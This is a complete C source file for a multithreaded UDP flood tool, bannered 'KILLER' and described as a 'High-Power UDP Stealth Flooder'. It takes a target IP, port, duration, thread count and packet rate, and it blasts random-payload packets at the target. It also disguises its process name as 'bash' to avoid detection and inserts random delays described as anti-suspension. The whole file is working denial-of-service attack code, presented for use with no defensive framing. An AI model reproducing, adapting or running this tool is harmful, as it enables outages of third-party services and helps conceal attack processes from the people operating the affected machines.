// Compile with: gcc stealth_killer_udp.c -o killer -lpthread -O2

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <ctype.h>
#include <sys/prctl.h>

#define MAX_PACKET_SIZE 1024
#define COLOR_RESET "\033[0m"
#define COLOR_RED "\033[1;31m"
#define COLOR_GREEN "\033[1;32m"
#define COLOR_YELLOW "\033[1;33m"

typedef struct {
    char ip[64];
    int port;
    int duration;
    int pps;
} thread_data_t;

volatile int active = 1;

void *flood(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(data->port);
    target.sin_addr.s_addr = inet_addr(data->ip);

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) pthread_exit(NULL);

    char packet[MAX_PACKET_SIZE];
    time_t start = time(NULL);
    int burst_pps = data->pps;

    while (active && (time(NULL) - start < data->duration)) {
        for (int i = 0; i < burst_pps; i++) {
            int len = rand() % (MAX_PACKET_SIZE - 200) + 200;
            for (int j = 0; j < len; j++)
                packet[j] = rand() % 256;

            sendto(sock, packet, len, 0, (struct sockaddr *)&target, sizeof(target));
        }

        // Anti-suspension: introduce random short delay
        usleep(5000 + rand() % 5000);  // 5ms to 10ms
    }

    close(sock);
    pthread_exit(NULL);
}

void print_banner() {
    printf(COLOR_RED);
    printf("\n██╗░░██╗██╗██╗░░░░░██╗░░░░░███████╗██████╗░\n");
    printf("██║░██╔╝██║██║░░░░░██║░░░░░██╔════╝██╔══██╗\n");
    printf("█████═╝░██║██║░░░░░██║░░░░░█████╗░░██████╔╝\n");
    printf("██╔═██╗░██║██║░░░░░██║░░░░░██╔══╝░░██╔═══╝░\n");
    printf("██║░╚██╗██║███████╗███████╗███████╗██║░░░░░\n");
    printf("╚═╝░░╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝░░░░░\n");
    printf(COLOR_YELLOW "  High-Power UDP Stealth Flooder\n" COLOR_RESET);
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        printf("Usage: %s <IP> <PORT> <SECONDS> <THREADS> <PPS>\n", argv[0]);
        return 1;
    }

    // Change process name to avoid easy detection in top/ps
    prctl(PR_SET_NAME, (unsigned long)"bash", 0, 0, 0);

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);
    int pps = atoi(argv[5]);

    srand(time(NULL));
    print_banner();

    printf(COLOR_GREEN "[*] Target: %s:%d | Duration: %ds | Threads: %d | PPS/thread: %d\n" COLOR_RESET,
           ip, port, duration, threads, pps);

    pthread_t th[threads];
    thread_data_t tdata;

    strncpy(tdata.ip, ip, sizeof(tdata.ip) - 1);
    tdata.port = port;
    tdata.duration = duration;
    tdata.pps = pps;

    for (int i = 0; i < threads; i++) {
        pthread_create(&th[i], NULL, flood, &tdata);
        usleep(10000); // slight stagger to avoid simultaneous spike
    }

    sleep(duration);
    active = 0;

    for (int i = 0; i < threads; i++) {
        pthread_join(th[i], NULL);
    }

    printf(COLOR_YELLOW "[+] Flood completed.\n" COLOR_RESET);
    return 0;
}
